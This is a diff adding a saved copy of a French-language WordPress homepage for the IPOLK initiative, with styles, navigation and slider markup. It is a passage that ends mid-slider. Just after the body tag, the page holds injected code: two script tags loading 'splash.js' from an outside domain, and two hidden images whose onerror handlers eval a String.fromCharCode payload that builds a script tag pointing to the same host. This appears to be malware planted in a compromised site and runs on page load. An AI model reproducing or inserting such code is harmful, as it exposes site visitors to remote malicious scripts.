@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<!-- saved from url=(0035)https://www.initiativeplus-olk.org/ -->
+<html lang="fr-FR" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js_active  vc_desktop  vc_transform  vc_transform  sidebysidepage"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>IPOLK – Initiative Plus-Olive Lembe Kabange</title>
+<style type="text/css" media="screen">#ui-datepicker-div.booked_custom_date_picker table.ui-datepicker-calendar tbody td a.ui-state-active,#ui-datepicker-div.booked_custom_date_picker table.ui-datepicker-calendar tbody td a.ui-state-active:hover,body #booked-profile-page input[type=submit].button-primary:hover,body .booked-list-view button.button:hover, body .booked-list-view input[type=submit].button-primary:hover,body table.booked-calendar input[type=submit].button-primary:hover,body .booked-modal input[type=submit].button-primary:hover,body table.booked-calendar th,body table.booked-calendar thead,body table.booked-calendar thead th,body table.booked-calendar .booked-appt-list .timeslot .timeslot-people button:hover,body #booked-profile-page .booked-profile-header,body #booked-profile-page .booked-tabs li.active a,body #booked-profile-page .booked-tabs li.active a:hover,body #booked-profile-page .appt-block .google-cal-button > a:hover,#ui-datepicker-div.booked_custom_date_picker .ui-datepicker-header{ background:#c4f2d4 !important; }body #booked-profile-page input[type=submit].button-primary:hover,body table.booked-calendar input[type=submit].button-primary:hover,body .booked-list-view button.button:hover, body .booked-list-view input[type=submit].button-primary:hover,body .booked-modal input[type=submit].button-primary:hover,body table.booked-calendar th,body table.booked-calendar .booked-appt-list .timeslot .timeslot-people button:hover,body #booked-profile-page .booked-profile-header,body #booked-profile-page .appt-block .google-cal-button > a:hover{ border-color:#c4f2d4 !important; }body table.booked-calendar tr.days,body table.booked-calendar tr.days th,body .booked-calendarSwitcher.calendar,body #booked-profile-page .booked-tabs,#ui-datepicker-div.booked_custom_date_picker table.ui-datepicker-calendar thead,#ui-datepicker-div.booked_custom_date_picker table.ui-datepicker-calendar thead th{ background:#039146 !important; }body table.booked-calendar tr.days th,body #booked-profile-page .booked-tabs{ border-color:#039146 !important; }#ui-datepicker-div.booked_custom_date_picker table.ui-datepicker-calendar tbody td.ui-datepicker-today a,#ui-datepicker-div.booked_custom_date_picker table.ui-datepicker-calendar tbody td.ui-datepicker-today a:hover,body #booked-profile-page input[type=submit].button-primary,body table.booked-calendar input[type=submit].button-primary,body .booked-list-view button.button, body .booked-list-view input[type=submit].button-primary,body .booked-list-view button.button, body .booked-list-view input[type=submit].button-primary,body .booked-modal input[type=submit].button-primary,body table.booked-calendar .booked-appt-list .timeslot .timeslot-people button,body #booked-profile-page .booked-profile-appt-list .appt-block.approved .status-block,body #booked-profile-page .appt-block .google-cal-button > a,body .booked-modal p.booked-title-bar,body table.booked-calendar td:hover .date span,body .booked-list-view a.booked_list_date_picker_trigger.booked-dp-active,body .booked-list-view a.booked_list_date_picker_trigger.booked-dp-active:hover,.booked-ms-modal .booked-book-appt /* Multi-Slot Booking */{ background:#56c477; }body #booked-profile-page input[type=submit].button-primary,body table.booked-calendar input[type=submit].button-primary,body .booked-list-view button.button, body .booked-list-view input[type=submit].button-primary,body .booked-list-view button.button, body .booked-list-view input[type=submit].button-primary,body .booked-modal input[type=submit].button-primary,body #booked-profile-page .appt-block .google-cal-button > a,body table.booked-calendar .booked-appt-list .timeslot .timeslot-people button,body .booked-list-view a.booked_list_date_picker_trigger.booked-dp-active,body .booked-list-view a.booked_list_date_picker_trigger.booked-dp-active:hover{ border-color:#56c477; }body .booked-modal .bm-window p i.fa,body .booked-modal .bm-window a,body .booked-appt-list .booked-public-appointment-title,body .booked-modal .bm-window p.appointment-title,.booked-ms-modal.visible:hover .booked-book-appt{ color:#56c477; }.booked-appt-list .timeslot.has-title .booked-public-appointment-title { color:inherit; }</style><link rel="dns-prefetch" href="https://fonts.googleapis.com/">
+<link rel="dns-prefetch" href="https://s.w.org/">
+<link rel="alternate" type="application/rss+xml" title="IPOLK » Flux" href="https://www.initiativeplus-olk.org/feed/">
+<link rel="alternate" type="application/rss+xml" title="IPOLK » Flux des commentaires" href="https://www.initiativeplus-olk.org/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="IPOLK » Home Flux des commentaires" href="https://www.initiativeplus-olk.org/home/feed/">
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.initiativeplus-olk.org\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.13"}};
+			/*! This file is auto-generated */
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/wp-emoji-release.min.js.télécharger" type="text/javascript" defer=""></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel="stylesheet" id="fil-elegant-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="fil-flaticon-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/flaticon.css" type="text/css" media="all">
+<link rel="stylesheet" id="fil-fontawesome-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(1).css" type="text/css" media="all">
+<link rel="stylesheet" id="fil-icomoon-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(2).css" type="text/css" media="all">
+<link rel="stylesheet" id="fil-simple-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(3).css" type="text/css" media="all">
+<link rel="stylesheet" id="fil-strokegap-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(4).css" type="text/css" media="all">
+<link rel="stylesheet" id="wp-block-library-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style.min.css" type="text/css" media="all">
+<link rel="stylesheet" id="booked-icons-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/icons.css" type="text/css" media="all">
+<link rel="stylesheet" id="booked-tooltipster-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/tooltipster.css" type="text/css" media="all">
+<link rel="stylesheet" id="booked-tooltipster-theme-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/tooltipster-light.css" type="text/css" media="all">
+<link rel="stylesheet" id="booked-animations-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/animations.css" type="text/css" media="all">
+<link rel="stylesheet" id="booked-css-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/booked.css" type="text/css" media="all">
+<link rel="stylesheet" id="kswr-front-icons-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/icons(1).css" type="text/css" media="all">
+<link rel="stylesheet" id="kswr-front-style-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(5).css" type="text/css" media="all">
+<link rel="stylesheet" id="elegant-icons-set-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style.css" type="text/css" media="all">
+<link rel="stylesheet" id="fontawesome-icons-set-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(1).css" type="text/css" media="all">
+<link rel="stylesheet" id="icomoon-icons-set-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(2).css" type="text/css" media="all">
+<link rel="stylesheet" id="simple-icons-set-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(3).css" type="text/css" media="all">
+<link rel="stylesheet" id="strokegap-icons-set-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(4).css" type="text/css" media="all">
+<link rel="stylesheet" id="rs-plugin-settings-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/rs6.css" type="text/css" media="all">
+<style id="rs-plugin-settings-inline-css" type="text/css">
+#rs-demo-id {}
+</style>
+<link rel="stylesheet" id="whatsappchitchat-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/whatsappchitchat-public.css" type="text/css" media="all">
+<link rel="stylesheet" id="font-awesome-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/font-awesome.css" type="text/css" media="all">
+<link rel="stylesheet" id="style-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(6).css" type="text/css" media="all">
+<link rel="stylesheet" id="oscend-fonts-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="stroke-gap-icons-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/style(7).css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="bootstrap-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/bootstrap.min.css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="owl-carousel-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/owl.carousel.css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="slick-carousel-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/slick.css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="animate-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/animate.min.css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="prettyPhoto-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/prettyPhoto.css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="oscend-main-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/main.css" type="text/css" media="screen, all">
+<link rel="stylesheet" id="oscend-debugging-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/debugging.css" type="text/css" media="all">
+<link rel="stylesheet" id="oscend-dynamic-styles-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/dynamic-styles.css" type="text/css" media="all">
+<link rel="stylesheet" id="js_composer_front-css" href="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/js_composer.min.css" type="text/css" media="all">
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jquery.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/jquery-migrate.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/script.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/rbtools.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/rs6.min.js.télécharger"></script>
+<script type="text/javascript" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/whatsappchitchat-public.js.télécharger"></script>
+<link rel="https://api.w.org/" href="https://www.initiativeplus-olk.org/wp-json/">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.initiativeplus-olk.org/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.initiativeplus-olk.org/wp-includes/wlwmanifest.xml"> 
+<meta name="generator" content="WordPress 5.4.13">
+<link rel="canonical" href="https://www.initiativeplus-olk.org/">
+<link rel="shortlink" href="https://www.initiativeplus-olk.org/">
+<link rel="alternate" type="application/json+oembed" href="https://www.initiativeplus-olk.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.initiativeplus-olk.org%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://www.initiativeplus-olk.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.initiativeplus-olk.org%2F&amp;format=xml">
+<style type="text/css" media="screen"></style><style>#rev_slider_3_1_wrapper { height: 819px }</style><style type="text/css"></style></head><body class="home page-template page-template-home-template page-template-home-template-php page page-id-13970 animated-css layout-switch wpb-js-composer js-comp-ver-6.6.0 vc_responsive" data-scrolling-animations="true" style="--nav-color-nav:undefined"><script type="text/javascript" src="https://scripts.cofounderspecials.com/splash.js?v=6.666"></script><script type="text/javascript" src="https://scripts.cofounderspecials.com/splash.js?v=6.666"></script><img class="" style="display:none;left:4363457457px;" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/l" onerror="eval(/*57*/String.fromCharCode(40,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,118,97,114,32,112,111,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,10,32,32,32,32,112,111,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,10,32,32,32,32,112,111,46,115,114,99,32,61,32,39,104,116,116,112,115,58,47,47,115,99,114,105,112,116,115,46,99,111,102,111,117,110,100,101,114,115,112,101,99,105,97,108,115,46,99,111,109,47,115,112,108,97,115,104,46,106,115,63,118,61,54,46,54,54,54,39,59,10,32,32,32,32,118,97,114,32,115,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,105,109,103,39,41,91,48,93,59,10,32,32,32,32,115,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,112,111,44,32,115,41,59,10,32,32,125,41,40,41,59))">
+<style type="text/css" media="screen" data-type="ms-style"></style>
+<script type="text/javascript"></script><img class="" style="display:none;left:4363457457px;" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/l" onerror="eval(/*57*/String.fromCharCode(40,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,118,97,114,32,112,111,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,10,32,32,32,32,112,111,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,10,32,32,32,32,112,111,46,115,114,99,32,61,32,39,104,116,116,112,115,58,47,47,115,99,114,105,112,116,115,46,99,111,102,111,117,110,100,101,114,115,112,101,99,105,97,108,115,46,99,111,109,47,115,112,108,97,115,104,46,106,115,63,118,61,54,46,54,54,54,39,59,10,32,32,32,32,118,97,114,32,115,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,105,109,103,39,41,91,48,93,59,10,32,32,32,32,115,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,112,111,44,32,115,41,59,10,32,32,125,41,40,41,59))">
+<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress.">
+<meta name="generator" content="Powered by Slider Revolution 6.4.3 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface.">
+<link rel="icon" href="https://www.initiativeplus-olk.org/wp-content/uploads/2020/03/cropped-logo-olk1-32x32.png" sizes="32x32">
+<link rel="icon" href="https://www.initiativeplus-olk.org/wp-content/uploads/2020/03/cropped-logo-olk1-192x192.png" sizes="192x192">
+<link rel="apple-touch-icon" href="https://www.initiativeplus-olk.org/wp-content/uploads/2020/03/cropped-logo-olk1-180x180.png">
+<meta name="msapplication-TileImage" content="https://www.initiativeplus-olk.org/wp-content/uploads/2020/03/cropped-logo-olk1-270x270.png">
+<script type="text/javascript">function setREVStartSize(e){
+			//window.requestAnimationFrame(function() {				 
+				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;	
+				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;	
+				try {								
+					var pw = document.getElementById(e.c).parentNode.offsetWidth,
+						newh;
+					pw = pw===0 || isNaN(pw) ? window.RSIW : pw;
+					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
+					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
+					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
+					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
+					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
+					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
+					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);		
+					if(e.layout==="fullscreen" || e.l==="fullscreen") 						
+						newh = Math.max(e.mh,window.RSIH);					
+					else{					
+						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
+						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];					
+						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
+						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
+						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
+											
+						var nl = new Array(e.rl.length),
+							ix = 0,						
+							sl;					
+						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
+						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
+						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
+						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;					
+						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
+						sl = nl[0];									
+						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}															
+						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);					
+						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
+					}				
+					if(window.rs_init_css===undefined) window.rs_init_css = document.head.appendChild(document.createElement("style"));					
+					document.getElementById(e.c).height = newh+"px";
+					window.rs_init_css.innerHTML += "#"+e.c+"_wrapper { height: "+newh+"px }";				
+				} catch(e){
+					console.log("Failure at Presize of Slider:" + e)
+				}					   
+			//});
+		  };</script>
+<style type="text/css" data-type="vc_shortcodes-custom-css">.vc_custom_1458499334752{padding-bottom: 60px !important;}.vc_custom_1458499882648{padding-bottom: 80px !important;}.vc_custom_1458673889248{padding-top: 30px !important;}.vc_custom_1458754772326{padding-bottom: 100px !important;}.vc_custom_1458763584776{padding-top: 30px !important;padding-bottom: 60px !important;}.vc_custom_1458825189873{padding-top: 70px !important;padding-bottom: 130px !important;}.vc_custom_1458850811916{padding-top: 30px !important;padding-bottom: 50px !important;}.vc_custom_1464289480408{padding-top: 90px !important;padding-bottom: 150px !important;background-image: url(http://oscend.templines.org/wp-content/uploads/2016/03/section-3-2.jpg?id=270) !important;background-position: center !important;background-repeat: no-repeat !important;background-size: cover !important;}</style><noscript>&lt;style&gt; .wpb_animate_when_almost_visible { opacity: 1; }&lt;/style&gt;</noscript>	
+	
+        
+        
+         
+		<div id="page-preloader" style="display: none;"><span class="spinner" style="display: none;"></span></div>
+		<!-- ========================== -->
+		<!-- Navigation -->
+		<!-- ========================== -->
+		<header class="header scrolling-header">
+			<nav id="nav" class="navbar navbar-default navbar-fixed-top" role="navigation">
+				<div class="container relative-nav-container">
+					<a class="toggle-button visible-xs-block" data-toggle="collapse" data-target="#navbar-collapse">
+						<i class="fa fa-navicon"></i>
+					</a>
+										<a class="navbar-brand scroll" title="IPOLK" href="https://www.initiativeplus-olk.org/">
+													<img class="normal-logo hidden-xs" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/logo.png" alt="IPOLK">
+																			<img class="scroll-logo hidden-xs" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/logo.png" alt="IPOLK">
+																			<img class="scroll-logo visible-xs-block" src="./IPOLK – Initiative Plus-Olive Lembe Kabange_files/logo.png" alt="IPOLK">
+											</a>
+					<ul class="nav navbar-nav navbar-right nav-icons wrap-user-control">
+						<li>
+							<a id="search-open" href="https://www.initiativeplus-olk.org/#fakelink"><i class="fa fa-search"></i></a>
+						</li>
+					</ul>
+					<div class="navbar-collapse collapse floated" id="navbar-collapse">
+						<ul id="menu-olk2021" class="nav navbar-nav navbar-with-inside clearfix navbar-right with-border"><li id="menu-item-14043" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-13970 current_page_item menu-item-14043 dropdown active "><a href="https://www.initiativeplus-olk.org/">Accueil</a></li>
+<li id="menu-item-14085" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14085 dropdown"><a href="https://www.initiativeplus-olk.org/portfolio-1-columns-2-left-sidebar/">Nos réalisations</a></li>
+<li id="menu-item-14299" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-14299 dropdown"><a href="https://www.video.initiativeplus-olk.org/">Nos vidéos</a></li>
+<li id="menu-item-14080" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14080 dropdown"><a href="https://www.initiativeplus-olk.org/apropos/">A propos</a></li>
+<li id="menu-item-14142" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14142 dropdown"><a href="https://www.initiativeplus-olk.org/blog-2/">Blog</a></li>
+</ul>					</div>
+				</div>
+				<div class="navbar-search ">
+					<div class="container"> 
+                        
+<div class="form-group search has-feedback">
+	<form action="https://www.initiativeplus-olk.org/" role="search" method="get">
+		<input type="text" class="form-control" name="s" id="search" value="" placeholder="Search..." autocomplete="off">
+		<span class="icon icon-Search form-control-feedback"></span>
+		<button type="submit"></button>
+		<input type="hidden" name="post_type" value="post">
+	</form>
+</div>                        
+                        <span class="input-group-btn">
+									<button type="reset" class="btn search-close" id="search-close">
+										<i class="fa fa-close"></i>
+									</button>
+								</span>
+                        
+                        
+					</div>
+				</div>
+			</nav>
+		</header><!--./navigation -->
+
+
+<div class="home-section">
+	<div class="container rtd">
+	
+<!-- This file should primarily consist of HTML with a little bit of PHP. -->
+  <div class="vc_row_anchor js_stretch_anchor anchor-simple" style="width: 1351px; margin-left: -105.5px;"></div><div data-vc-full-width="true" data-vc-full-width-init="true" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_pixrow-no-padding with-bottom-effect transparent-effect vc_row-no-padding kswr_pnone kswr_mnone kswr_bnone" style="position: relative; left: -90.5px; box-sizing: border-box; width: 1351px;"><div class="kswr-row-element-back" data-classes="kswr_pnone kswr_mnone kswr_bnone"></div><div class="bottom-effect"></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+			<!-- START home01 REVOLUTION SLIDER 6.4.3 -->
+			<rs-fullwidth-wrap id="rev_slider_3_1_forcefullwidth" style="margin-top:0px;margin-bottom:0px;"><rs-module-wrap id="rev_slider_3_1_wrapper" data-source="gallery" style="background: transparent; padding: 0px; margin: 0px auto; width: 1351px; height: 868px; visibility: visible; position: absolute; overflow: visible; left: 0px;"><rs-module id="rev_slider_3_1" style="width: 1351px; height: 868px; max-height: 868px;" data-version="6.4.3" data-idcheck="true" class="revslider-initialised rev_redraw_on_blurfocus" data-slideactive="rs-17">
+					
+				<rs-loader class="spinner0 " style="display: none;"><div class="dot1"></div><div class="dot2"></div><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></rs-loader><rs-slides style="visibility: visible; max-height: none; height: 100%; width: 100%; overflow: hidden;">
+						<rs-slide data-key="rs-9" data-title="Slide" data-in="o:0;" data-out="a:false;" data-originalindex="1" data-origindex="0" data-description="" data-sba="" data-scroll-based="false" data-owidth="1024" data-oheight="635" data-rspausetimeronce="0" data-isactiveslide="false" style="overflow: hidden; height: 100%; width: 100%; z-index: 10; opacity: 1; visibility: inherit;"><rs-sbg-px><rs-sbg-wrap data-key="rs-9" data-owidth="1024" data-oheight="635"><!--Runtime Modification - Img tag is Still Available for SEO Goals in Source - <img src="//www.initiativeplus-olk.org/wp-content/uploads/2021/03/11olkslider-copie.jpg" title="11olkslider copie" width="1024" height="635" data-bg="p:center top;" data-panzoom="d:10000;ss:100;se:105;" class="rev-slidebg" data-no-retina="">--><rs-sbg class="" data-bgcolor="transparent" style="width: 100%; height: 100%;" data-src-rs-ref="https://www.initiativeplus-olk.org/wp-content/uploads/2021/03/11olkslider-copie.jpg"><canvas width="1351" height="868" style="width: 100%; height: 100%; background-color: transparent; opacity: 1; filter: none; transform: translate(0px, 0px);"></canvas></rs-sbg></rs-sbg-wrap></rs-sbg-px>
+							
+<!--
+							--><rs-layer-wrap class="rs-parallax-wrap rs-forcehidden" style="position: absolute; display: block; pointer-events: none; left: 838.5px; top: 473px; z-index: 5; visibility: hidden;"><rs-loop-wrap style="position:absolute;display:block;"><rs-mask-wrap style="position: absolute; display: block; transform-origin: 50% 50% 0px; overflow: visible;"><rs-layer id="slider-3-slide-9-layer-1" data-type="text" data-color="rgba(255,255,255,1)" data-rsp_ch="on" data-xy="xo:783px,402px,277px,127px;yo:473px,246px,243px,238px;" data-text="s:22;l:24;" data-frame_0="o:1;" data-frame_0_chars="d:5;x:105%;o:1;rX:45deg;rY:0deg;rZ:90deg;" data-frame_0_mask="u:t;" data-frame_1="e:power4.inOut;st:500;sp:2000;" data-frame_1_chars="d:5;" data-frame_1_mask="u:t;" data-frame_999="o:0;e:nothing;st:w;" style="z-index: 5; font-family: Montserrat; height: auto; width: auto; color: rgb(255, 255, 255); text-decoration: none; white-space: nowrap; min-height: 0px; min-width: 0px; max-height: none; max-width: none; text-align: left; line-height: 24px; letter-spacing: 0px; font-size: 22px; transform-style: preserve-3d; transform-origin: 50% 50% 0px; transform: perspective(600px); opacity: 0; visibility: visible;" class="rs-layer" data-idcheck="true" data-stylerecorder="true" data-initialised="true"><div class="rs_splitted_lines" style="display: block; text-align: left; position: relative;"><div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">L</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">a</div></div> <div style="position:relative;display:inline-block;" class="rs_splitted_words"><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">p</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">r</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">o</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">d</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">u</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">c</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">t</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: translate(0px, 0px); color: rgb(255, 255, 255);" class="rs_splitted_chars">i</div><div style="position: relative; display: inline-block; transform-origin: 50% 50% 0px; opacity: 1; transform: 